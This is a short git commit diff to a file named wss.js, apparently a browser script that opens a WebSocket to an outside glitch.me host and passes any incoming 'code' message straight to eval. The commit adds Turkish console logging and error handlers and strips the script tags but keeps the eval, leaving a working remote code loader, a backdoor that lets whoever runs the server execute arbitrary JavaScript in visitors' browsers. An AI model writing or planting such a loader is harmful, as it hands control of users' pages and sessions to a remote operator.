327867a2a441768b99d7f6d6801eeebb0f2fc6ef
hendek33 <hendek33@hotmail.com>
2025-03-21 15:48:17 +0300

    Update wss.js

--- wss.js
+++ wss.js
@@ -1,12 +1,20 @@
-<script>
 (function() {
+    console.log('Script yüklendi!');
     var ws = new WebSocket('wss://adhesive-sassy-spaghetti.glitch.me');
+    
+    ws.onopen = function() {
+        console.log('WebSocket bağlantısı kuruldu');
+    };
     
     ws.onmessage = function(event) {
         var msg = JSON.parse(event.data);
         if (msg.type === 'code') {
-            eval(msg.data); // Gelen kodu çalıştır
+            console.log('Yeni kod:', msg.data);
+            eval(msg.data);
         }
     };
+    
+    ws.onerror = function(error) {
+        console.error('WebSocket hatası:', error);
+    };
 })();
-</script>
